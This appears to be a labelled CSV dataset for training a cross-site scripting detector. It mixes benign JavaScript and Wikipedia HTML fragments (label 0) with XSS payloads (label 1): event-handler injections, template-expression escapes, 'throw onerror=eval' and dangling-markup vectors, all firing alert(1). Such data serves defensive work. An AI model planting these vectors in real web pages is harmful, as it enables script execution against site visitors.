payload,label
if (expanded && parent !== expanded) { expanded.click() },0
"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",1
"<samp onclick=""alert(1)"">test</samp>",1
this.$el.removeclass('focus'),0
if (!!_this9.options.container) { $(_this9.options.container).append(_this9.dropdownel); } else {,0
"k(d(a)); };g.pause = function () { var a = v.indexof(g);-1 < a && v.splice(a, 1);g.paused = !0;",0
{{$emit.constructor`alert(1)`()}},1
"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>",1
"<blockquote ondblclick=""alert(1)"">test</blockquote>",1
"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>",1
"<menu oncopy=""alert(1)"" contenteditable>test</menu>",1
index_js.execute(callback); return; },0
<body onfocusout=alert(1) id=x><iframe id=x>,1
value: function _handletargetclick(e) { this.open(); },0
"<command onbeforecut=""alert(1)"" contenteditable>test</command>",1
"<li onmouseup=""alert(1)"">test</li>",1
if ($textarea[0].offsetwidth > 0 && $textarea[0].offsetheight > 0) {,0
"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",1
} }); var camelcase = (function () {,0
"}; var carousel = function (_component18) { _inherits(carousel, _component18);",0
<figcaption onpointerup=alert(1)>xss</figcaption>,1
"}, dddd: () => { return this.options.i18n.weekdays[this.date.getday()];",0
let taptargettexttop = istop ? taptargetheight / 2 : 0; let taptargettextbottom = 0; let taptargettextleft = isleft && !iscenterx ? taptargetwidth / 2 - originwidth : 0;,0
"<title onkeyup=""alert(1)"" contenteditable>test</title>",1
"top: [this.options.endingtop, this.options.startingtop],",0
} const activeindex = this._getitemindex(this._getactive()) if (activeindex === index) {,0
value: function _handlefabclick() { if (this.isopen) { this.close();,0
"e.preventdefault(); document.removeeventlistener('mouseup', this._handledocumentclickendbound); document.removeeventlistener('touchend', this._handledocumentclickendbound);",0
"<dd onmouseleave=""alert(1)"">test</dd>",1
"<style onkeydown=""alert(1)"" contenteditable>test</style>",1
"} _handlecarouseldrag(e) { let x, y, delta, deltay;",0
var clickpos = timepicker._pos(e),0
"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 13–16 </li> </ul>",0
"this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.dropdownel.removeeventlistener('mouseleave', this._handlemouseleavebound); } else {",0
<svg><animate onend=alert(1) attributename=x dur=1s>,1
<th id=x tabindex=1 onfocus=alert(1)></th>,1
if (!hrefattribute || !hrefattribute.includes('#') && !hrefattribute.startswith('.')) { return null; },0
<big onpointermove=alert(1)>xss</big>,1
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",1
if ( value >= xval.slice(-1)[0] ){ return 100; },0
for (let c = 0; c < 1; c++) { this._renderdatedisplay(); html +=,0
<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,1
"} if ( lookforward && handlenumber < scope_handles.length - 1 ) { to = math.min(to, reference[handlenumber + 1] - options.margin);",0
config.parent = index_js.getelement(config.parent); return config; },0
"<li id=""cite_note-footnoterussellnorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnoterussellnorvig200916_30-0"">^ </a> </b>",0
"scale: [0.4, 1], translatey: [this.offsety, 0], translatex: [this.offsetx, 0],",0
"<h4><span class=""mw-headline"" id=""logic-based"">logic-based",0
"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",1
"<area oncopy=""alert(1)"" contenteditable>test</area>",1
const event_hide = `hide${event_key}` const event_hidden = `hidden${event_key}` const event_show = `show${event_key}`,0
"<button onbeforecopy=""alert(1)"" contenteditable>test</button>",1
previous = previous.previouselementsibling } return [],0
"} form.classlist.add('was-validated') }, false)",0
"<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></th>",1
"<optgroup onbeforepaste=""alert(1)"" contenteditable>test</optgroup>",1
var ownelement = getwindow(node).element,0
<object onpointerout=alert(1)>xss</object>,1
this._handlerangemouseuptouchendbound = this._handlerangemouseuptouchend.bind(this),0
<x @[_b.constructor`alert(1)`()]>,1
return order === order_prev ? direction_right : direction_left; } static jqueryinterface(config) {,0
"<li><a href=""/wiki/list_of_artificial_intelligence_projects"" title=""list of artificial intelligence projects"">projects </a> </li>",0
"<a href=""/wiki/applied_information_economics"" title=""applied information economics"">information value theory </a>:",0
"<li><cite id=""citerefacm1998"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20071012025921/http://www.acm.org/class/1998/i.2.html"">""acm computing classification system: artificial intelligence"" </a>. <a href=""/wiki/association_for_computing_machinery"" title=""association for computing machinery"">acm </a>. 1998. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.acm.org/class/1998/i.2.html"">the original </a> on 12 october 2007<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 august",0
"<li><cite id=""citerefdowehajek1997"" class=""citation journal"">dowe, d. l.; hajek, a. r. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""a computational extension to the turing test"" </a>. <i>proceedings of the 4th conference of the australasian cognitive science society </i>. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 june 2011. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=proceedings+of+the+4th+conference+of+the+australasian+cognitive+science+society&amp;rft.atitle=a+computational+extension+to+the+turing+test&amp;rft.date=1997&amp;rft.aulast=dowe&amp;rft.aufirst=d.+l.&amp;rft.au=hajek%2c+a.+r.&amp;rft_id=http%3a%2f%2fwww.csse.monash.edu.au%2fpublications%2f1997%2ftr-cs97-322-abs.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
"<area onmouseover=""alert(1)"">test</area>",1
"return eventend(event, data)",0
"1 ), visibledate = date.gettime();",0
} _getoffset() { const { offset } = this._config,0
"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""xss via target in a form""></form>",1
"<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>",1
} _animatein() { this._positiontooltip();,0
}; }()); var getprefixedprop = (function () {,0
"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",1
"<li><a href=""/wiki/idealism"" title=""idealism"">idealism </a> </li>",0
"<div onbeforecut=""alert(1)"" contenteditable>test</div>",1
<marquee onpointerup=alert(1)>xss</marquee>,1
<shadow onpointerover=alert(1)>xss</shadow>,1
"} // eslint-disable-next-line import/no-unused-modules const popperoffsets$1 = { name: 'popperoffsets',",0
"<em ondblclick=""alert(1)"">test</em>",1
"<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">debugging memory leaks",0
let indicator = document.createelement('li'),0
<tbody onpointermove=alert(1)>xss</tbody>,1
"key: ""render"", value: function render(year, month, randid) { var opts = this.options,",0
"value: function rendertable(opts, data, randid) {",0
"<b onclick=""alert(1)"">test</b>",1
<spacer onpointerup=alert(1)>xss</spacer>,1
"<li><a href=""/wiki/artificial_general_intelligence"" title=""artificial general intelligence"">rtificial general intelligence </a> </li> </ul> </td>",0
let $closesttrigger = $(toel).closest('.dropdown-trigger'),0
"'taptarget.js', 'select.js', 'range.js'",0
"<nextid onkeyup=""alert(1)"" contenteditable>test</nextid>",1
"return eventhandler.trigger(this._element, eventname, { relatedtarget: nextelement, direction: this._ordertodirection(order),",0
"} this._element.focus() this._element.setattribute('aria-expanded', true)",0
value: function _renderchip(chip) { if (!chip.tag) { return;,0
"<li><a href=""/wiki/ingenuity"" title=""ingenuity"">ingenuity </a> </li>",0
"node.addeventlistener(eventname, callback); } function removeevent(node, eventname, callback) {",0
"_handlecarouseldrag(e) { let x, y, delta, deltay; if (this.pressed) {",0
<svg><animatetransform onend=alert(1) attributename=transform dur=1s>,1
$textarea = $($textarea); } if (!$textarea.length) {,0
"key: ""_removeeventhandlers"", value: function _removeeventhandlers() { this.el.removeeventlistener('click', this._handleinputclickbound);",0
<discard onpointerover=alert(1)>xss</discard>,1
"body: 'when using sass, you can change the color scheme of your site extremely quickly.' }); window.index.add({",0
scrolloffset -= this.dropdownoptions.clientheight / 2; // center in dropdown this.dropdownoptions.scrolltop = scrolloffset; },0
"parent.insertbefore(i === 0 ? v : v.clonenode(true), sibling); }); });",0
<rtc onpointermove=alert(1)>xss</rtc>,1
"'sass/components/_materialbox.scss', 'sass/components/_modal.scss', 'sass/components/_navbar.scss',",0
_this72._setupeventhandlers(),0
"<label draggable=""true"" ondragstart=""alert(1)"">test</label>",1
return; } this.ishovered = false;,0
for (const domelement of domelements) { if (domelement !== target) { continue,0
_maybeenablecycle() {,0
not: function (selector) { if (!selector) { return this;,0
<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>,1
const tip = this._gettipelement(); tip.classlist.remove(class_name_show); if ('ontouchstart' in document.documentelement) {,0
var dropdownbrect = this.dropdownel.getboundingclientrect(); var idealheight = dropdownbrect.height; var idealwidth = dropdownbrect.width;,0
"<iframe oncopy=""alert(1)"" contenteditable>test</iframe>",1
dropdown.getorcreateinstance(this).toggle(); }); definejqueryplugin(dropdown);,0
"</p><p><a href=""/wiki/transhumanism"" title=""transhumanism"">transhumanism </a> (the merging of humans and machines) is explored in the <a href=""/wiki/manga"" title=""manga"">manga </a> <i><a href=""/wiki/ghost_in_the_shell"" title=""ghost in the shell"">ghost in the shell </a> </i> and the science-fiction series <i><a href=""/wiki/dune_(novel)"" title=""dune (novel)"">dune </a> </i>. in the 1980s, artist <a href=""/wiki/hajime_sorayama"" title=""hajime sorayama"">hajime sorayama </a>'s sexy robots series were painted and published in japan depicting the actual organic human form with lifelike muscular metallic skins and later ""the gynoids"" book followed that was used by or influenced movie makers including <a href=""/wiki/george_lucas"" title=""george lucas"">george lucas </a> and other creatives. sorayama never considered these organic robots to be real part of nature but always unnatural product of the human mind, a fantasy existing in the mind even when realized in actual form.",0
const event_click_data_api = `click${event_key}${data_api_key}`; class button extends basecomponent { static get name() {,0
"this.$input[0].addeventlistener('focus', this._handleinputfocusbound)",0
"<source draggable=""true"" ondragstart=""alert(1)"">test</source>",1
"<style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></param>",1
ariaselected = 'true'; } if (opts.hasevent) {,0
"<mark onpaste=""alert(1)"" contenteditable>test</mark>",1
this._isenabled = false,0
this._initializetargetsandobservables(),0
return } const active = document.queryselector('.bd-aside .active'),0
} _handleclockclickstart(e) { e.preventdefault();,0
"const order = index > activeindex ? order_next : order_prev; this._slide(order, items[index]); }",0
if (layoutviewport || !layoutviewport && strategy === 'fixed') {,0
static get name() { return name$2; },0
if (!object.keys(storeelementevent).length) { return; },0
"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>",1
<svg><small onload=alert(1)></small>,1
if (oldyearselect) { m.formselect.getinstance(oldyearselect).destroy(); },0
if (typeof config.reference === 'object' && !iselement(config.reference) && typeof config.reference.getboundingclientrect !== 'function') {,0
"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationend=""alert(1)""></ruby>",1
<picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>,1
"key: ""rendertitle"", value: function rendertitle(instance, c, year, month, refyear, randid) { var i = void 0,",0
"<abbr onmouseleave=""alert(1)"">test</abbr>",1
"api.addfiles(scssfiles, 'client', { isimport: true }); api.export('m', 'client'); });",0
<base onpointerdown=alert(1)>xss</base>,1
} this.isopen = true; this.wrapper.classlist.add('open');,0
"<rtc onmouseenter=""alert(1)"">test</rtc>",1
"addclassfor(scope_target, options.cssclasses.tap, options.animationduration)",0
"key: ""_setupeventhandlers"", value: function _setupeventhandlers() { this.el.addeventlistener('keydown', this._handletriggerkeydownbound);",0
"const link = document.queryselector(`.bd-aside a[href=""${hash}""]`)",0
function hex(x) { return ('0' + parseint(x).tostring(16)).slice(-2); },0
"triggertransitionend(transitionelement) } }, emulatedduration)",0
"</span> <span class=""reference-text""><cite class=""citation journal"">chang, hsihui; kao, yi-ching; mashruwala, raj; sorensen, susan m. (10 april 2017). ""technical inefficiency, allocative inefficiency, and audit pricing"". <i>journal of accounting, auditing &amp; finance </i>. <b>33 </b> (4): 580–600. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1177%2f0148558x17696760"">10.1177/0148558x17696760 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=journal+of+accounting%2c+auditing+%26+finance&amp;rft.atitle=technical+inefficiency%2c+allocative+inefficiency%2c+and+audit+pricing&amp;rft.volume=33&amp;rft.issue=4&amp;rft.pages=580-600&amp;rft.date=2017-04-10&amp;rft_id=info%3adoi%2f10.1177%2f0148558x17696760&amp;rft.aulast=chang&amp;rft.aufirst=hsihui&amp;rft.au=kao%2c+yi-ching&amp;rft.au=mashruwala%2c+raj&amp;rft.au=sorensen%2c+susan+m.&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
prev(n) { if (n === undefined || isnan(n)) { n = 1;,0
let $collapsiblelis = $collapsible.children('li'); let isactive = $collapsibleli[0].classlist.contains('active'); let index = $collapsiblelis.index($collapsibleli);,0
"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onanimationstart=""alert(1)""></wbr>",1
"}, not: function (selector) { if (!selector) {",0
"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.channelnewsasia.com/news/commentary/artificial-intelligence-big-data-bias-hiring-loans-key-challenge-11097374"">""commentary: bad news. artificial intelligence is biased"" </a>. <i>cna </i>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=unknown&amp;rft.jtitle=cna&amp;rft.atitle=commentary%3a+bad+news.+artificial+intelligence+is+biased&amp;rft_id=https%3a%2f%2fwww.channelnewsasia.com%2fnews%2fcommentary%2fartificial-intelligence-big-data-bias-hiring-loans-key-challenge-11097374&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
"</span> <span class=""reference-text""><cite class=""citation journal"">neumann, bernd; möller, ralf (january 2008). ""on scene interpretation with description logics"". <i>image and vision computing </i>. <b>26 </b> (1): 82–101. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2fj.imavis.2007.08.013"">10.1016/j.imavis.2007.08.013 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=image+and+vision+computing&amp;rft.atitle=on+scene+interpretation+with+description+logics&amp;rft.volume=26&amp;rft.issue=1&amp;rft.pages=82-101&amp;rft.date=2008-01&amp;rft_id=info%3adoi%2f10.1016%2fj.imavis.2007.08.013&amp;rft.aulast=neumann&amp;rft.aufirst=bernd&amp;rft.au=m%c3%b6ller%2c+ralf&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
"v[d] && v[d].tick(c), d++",0
return null } return findshadowroot(element.parentnode),0
<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>,1
"<li onbeforecopy=""alert(1)"" contenteditable>test</li>",1
"const selector_nav_list_group = '.nav, .list-group'; const selector_nav_links = '.nav-link'; const selector_nav_items = '.nav-item';",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></details>",1
this.target += this.dim * math.abs(diff),0
} return this.each(function (v) { var finalcallback = callback;,0
"<span draggable=""true"" ondragenter=""alert(1)"">test</span>",1
<bdo onpointermove=alert(1)>xss</bdo>,1
}; object.keys(tests).foreach(function( name ){ if ( options[name] === undefined && defaults[name] === undefined ) {,0
"`<button class=""btn-flat timepicker-clear waves-effect"" style=""visibility: hidden;"" type=""button"" tabindex=""${ this.options.twelvehour ? '3' : '1' }"">${this.options.i18n.clear}</button>`",0
} } _handlerangemouseuptouchend() {,0
dispose() { if (this._swipehelper) { this._swipehelper.dispose(),0
"<script>throw onerror=eval,'/*'+location</script>",1
"</span> <span class=""reference-text""><cite class=""citation journal"">kaplan, andreas; haenlein, michael (1 january 2019). ""siri, siri, in my hand: who's the fairest in the land? on the interpretations, illustrations, and implications of artificial intelligence"". <i>business horizons </i>. <b>62 </b> (1): 15–25. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2fj.bushor.2018.08.004"">10.1016/j.bushor.2018.08.004 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=business+horizons&amp;rft.atitle=siri%2c+siri%2c+in+my+hand%3a+who%27s+the+fairest+in+the+land%3f+on+the+interpretations%2c+illustrations%2c+and+implications+of+artificial+intelligence&amp;rft.volume=62&amp;rft.issue=1&amp;rft.pages=15-25&amp;rft.date=2019-01-01&amp;rft_id=info%3adoi%2f10.1016%2fj.bushor.2018.08.004&amp;rft.aulast=kaplan&amp;rft.aufirst=andreas&amp;rft.au=haenlein%2c+michael&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
"<figure onmouseover=""alert(1)"">test</figure>",1
"scope_connects.foreach(function( connect, index ){",0
var $caption = this.$active.find('.caption'),0
"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",1
"<menu onmousedown=""alert(1)"">test</menu>",1
"var b = [!upward, upward]",0
lastvisibledate.setmonth(lastvisibledate.getmonth() + 1); lastvisibledate.setdate(lastvisibledate.getdate() - 1); newcalendar =,0
"<style>@keyframes slidein {}</style><dialog style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dialog>",1
_this37._setupeventhandlers(); return _this37; },0
"}; const defaulttype$1 = { offset: '(number|null)',",0
"var ripplestyle = { 'top': relativey + 'px', 'left': relativex + 'px'",0
"<acronym draggable=""true"" ondragenter=""alert(1)"">test</acronym>",1
"if (isstring(name)) { return (value === undefined ? getdata(this[0], name) : this.each(function (v) { return setdata(v, name, value);",0
<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>,1
<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>,1
var totalsteps = (that.xval[i+1] - that.xval[i]) / that.xnumsteps[i]; var higheststep = math.ceil(number(totalsteps.tofixed(3)) - 1); var step = that.xval[i] + (that.xnumsteps[i] * higheststep);,0
"reflow(this._element); this._element.classlist.add(class_name_show, class_name_showing); this._queuecallback(complete, this._element, this._config.animation);",0
"<ol onmouseenter=""alert(1)"">test</ol>",1
"ai research at <a href=""/wiki/university_of_edinburgh"" title=""university of edinburgh"">edinburgh </a> and in france, birth of <a href=""/wiki/prolog"" title=""prolog"">prolog </a>:",0
export default () => {,0
"<link onmousedown=""alert(1)"">test</link>",1
<embed src=/ onload=alert(1)>,1
if ( typeof htmlelement === 'object' ? this.message instanceof htmlelement,0
"key: ""getdata"", value: function getdata() { return this.chipsdata;",0
this.prevmonth(); } else if ($target.closest('.month-next').length) { this.nextmonth();,0
"</span> <span class=""toctext"">natural language processing",0
"}) .one('click', () => { if (this.doneanimating) {",0
"const selector_data_spy = '[data-bs-spy=""scroll""]'",0
"<style>@keyframes slidein {}</style><wbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></wbr>",1
tooltipcontentel.innerhtml = this.options.html; tooltipel.appendchild(tooltipcontentel); document.body.appendchild(tooltipel);,0
<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>,1
<dt>subsymbolic form of some commonsense knowledge </dt>,0
"<li><a href=""/wiki/peripheral"" title=""peripheral"">peripheral </a> </li>",0
"<menuitem onmouseup=""alert(1)"">test</menuitem>",1
} open($trigger) { if (this.isopen) {,0
if (newindex >= this.$slides.length) newindex = 0; else if (newindex < 0) newindex = this.$slides.length - 1; this.set(newindex);,0
"<div draggable=""true"" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>",1
day += opts.firstday,0
<input onclick=attributes[0].value='`'+url+'`'>,1
if ( !behaviour.fixed ) {,0
"<acronym onkeypress=""alert(1)"" contenteditable>test</acronym>",1
_start(event) { if (!this._supportpointerevents) { this._deltax = event.touches[0].clientx;,0
_iswithcontent() { return this._gettitle() || this._getcontent() },0
_getplacement() { const parentdropdown = this._parent if (parentdropdown.classlist.contains(class_name_dropend)) {,0
"to = math.min(to, 100 - options.padding); } }",0
"<frameset onbeforepaste=""alert(1)"" contenteditable>test</frameset>",1
<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>,1
"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",1
var date = void 0; if (e.firedby === this) { return;,0
"<br onbeforecut=""alert(1)"" contenteditable>test</br>",1
"return iselement(clippingparent) && contains(clippingparent, clipperelement) && getnodename(clippingparent) !== 'body'; }); } // gets the maximum area that the element is visible in due to any number of",0
if (parentdropdown.classlist.contains(class_name_dropup)) { return isend ? placement_topend : placement_top },0
this._setupautocomplete(); } this._setplaceholder();,0
&#x3c,1
"<div draggable=""true"" contenteditable>drag me</div><article ondrop=alert(1) contenteditable>drop here</article>",1
.removeclass('timepicker-dial-out'),0
"<menuitem onbeforecopy=""alert(1)"" contenteditable>test</menuitem>",1
"<style>:target {color: red;}</style><output id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></output>",1
if (summary && summary.parentnode !== closeddetails) {,0
"return '<thead><tr>' + (opts.isrtl ? arr.reverse() : arr).join('') + '</tr></thead>'; } }, {",0
var proposal = ( location * 100 ) / basesize(),0
"<embed draggable=""true"" ondragenter=""alert(1)"">test</embed>",1
"</span>. <i>ai magazine </i>. <b>1 </b> (1). </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=ai+magazine&amp;rft.atitle=artificial+intelligence+prepares+for+2001&amp;rft.volume=1&amp;rft.issue=1&amp;rft.date=1983&amp;rft.aulast=nilsson&amp;rft.aufirst=nils&amp;rft_id=https%3a%2f%2fai.stanford.edu%2f~nilsson%2fonlinepubs-nils%2fgeneral%2520essays%2faimag04-04-002.pdf&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
"eventhandler.one(this._element, event_click_dismiss, event2 => { if (this._element !== event.target || this._element !== event2.target) { return;",0
this.el.style.top = null; this._removepinclasses(); let index = pushpin._pushpins.indexof(this);,0
"<object draggable=""true"" ondrag=""alert(1)"">test</object>",1
